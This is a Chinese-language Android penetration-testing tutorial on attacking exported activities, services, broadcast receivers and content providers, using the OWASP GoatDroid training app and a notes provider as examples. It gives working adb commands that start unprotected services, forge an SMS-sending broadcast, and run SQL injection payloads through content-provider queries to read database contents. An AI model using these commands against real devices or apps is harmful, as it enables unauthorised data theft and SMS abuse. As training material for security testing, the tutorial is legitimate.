## 攻击应用组件
### 针对activity的攻击
如果导出属性为true，那么activity可以被其他应用的组件调用；如果为false，则activity只能被同一个应用或具有相同用户ID的应用的组件调用。

### 针对service的攻击
安卓应用中的服务通常用于在后台长时间运行的任务。虽然这是服务的常见用法，但是，还存在一些其他类型的服务,他们能为设备上的其他应用或同一应用的其他组件提供接口。
所以，服务基本上可以分为两种：启动和绑定。
我们可以使用startService(）来启动服务。服务启动后，会在后台不停的运行，即使启动该服务的组件已经销毁。
也可以使用bindService()来绑定服务，绑定服务提供了一个从客户端到服务端的接口，能够让组件与服务进行交互、发送请求、获取结果，甚至可以通过进程间通信在不同的
进程上实现这些功能。
可以通过下面三种方法创建绑定服务：
- 扩展Binder类
如果开发者想要在同一个应用中调用某个服务，建议使用这种方法。这样，设备上的其他应用就不能调用这个服务。
具体方法是：扩展Binder类来创建一个接口，并从onBind()返回一个关于它的实例，客户端接收到binder后，可以通过它直接访问该服务中的公共方法。

- 使用Messenger
如果需要跨进程使用接口，可以使用Messenger为服务创建一个接口。通过这种方式创建的服务可以定义Handler，而且Handler能够响应不同类型的Message对象。这样，客户端
可以使用Message对象向服务发送命令。

- 使用AIDL
AIDL是一种允许一个应用调用另外一个应用的方法。
与activity类似，一个未受保护的服务也可以被其他设备上其他应用调用。使用startService()就可以调用第一种服务，方法通俗易懂，我们通过adb命令也可以调用第一种服务。
我们可以通过am工具指定startservice选项来调用这个服务,示例：
服务的service name = ".services.LocationService"
intent filter action name = "org.owasp.goatdroid.forgoats"
```shell
adb shell am startservice -n org.owasp.goatdroid.forgoats/.services.LocationService -a org.owasp.goatdroid.forgoats.services.LocationService
```

### 针对广播接收器的攻击
广播接收器是安卓系统中最常见的组件之一，开发者可以利用广播接收器来添加很多功能。
导出的广播接收器容易受到攻击。
比如：
广播的 name = ".broadcastreceivers.SendSMSNowReceiver"
intent filter action name = "org.owasp.goatdroid.forgoats.SOCIAL_SMS"
应用是无法检测是谁发送了广播事件。攻击者可以利用这一点，并使用一下的命令来创建一个特殊的Intent：

```shell
adb shell am broadcast -a org.owasp.goatdroid.forgoats.SOCIAL_SMS -n org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats/.broadcastreceivers.
SendSMSNowReceiver -es phoneNumber 5556 -es message CRACKED
```
- am broadcast: 发送广播请求
- -a: 指定action元素
- -n: 指定组件名称
- -es: 指定字符串键值对的其他名称

### 对内容提供程序的攻击
如果应用的目标SDK版本号是api 17,那么默认是导出的。从api 17开始，这个默认值改变了，默认为false。

#### 查询内容提供程序
如果内容提供程序是导出的，我们可以对它进行查询并读取其中的内容，也可以插入或删除内容，但是，在此之前，我们需要首先找到内容提供程序的URI。使用Apktool分解apk文件
时，它会在smali文件夹中生成一些.smali文件。
得到smali文件后
我们可以使用grep命令进行地柜搜索，查找包含“content://”的字符串：
```shell
grep -lr "content://" * Note$NoteAccount.smali NoteProvider.smali
```
找到URI后，比如“content://com.sonyericsson.notes.provider.Note/notes/”
接下来，根据上面的URI读取内容就很简单了，只需执行命令：
```shell
adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/
```
在安卓4.1.1系统开始使用了content命令。这实际上是存放在/system/bin/content下的一个脚本。可以利用它通过adb shell直接读取内容提供程序。
按照下面的方法运行前面的命令，可以读取内容提供程序数据库的内容：
```shell
adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/
```

#### 通过adb对内容提供程序进行SQL注入
内容提供程序通常是基于SQLite数据库的。如果输入数据库的命令没有经过合适的处理，就会发生于Web应用相同的SQL注入的情形。
查询条件语句
```shell
adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/ --where "_id=1"
```
给查询语句加上单引号
```shell
adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/ --where "_id=1'"
```
这个时候会报错误单引号位于后半个括号之前，从而导致一个错误,
因此我们可以在条件语句中首先关闭括号，在括号后注入自己的sql语句。
```shell
adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/ --where "_id=1 ) union select 1,2,3,4-- ("
```
上面的命令可以看到两种数据库查询结果

##### 运行数据库函数
对前面的查询语句进行简单的修改，我们可以提取出更过的信息，如数据库版本号，表名以及其他有趣的信息

- 查找Sqlite版本号 sqlite_version()
  ```shell
  adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/ --where "_id=1 ) union select 1,sqlite_version(),3,4-- ("
  ```

- 查找表名 tbl_name()
  ```shell
  adb shell content query --uri content://com.sonyericsson.notes.provider.Note/notes/ --where "_id=1 ) union select 1,tbl_name(),3,4-- ("
  ```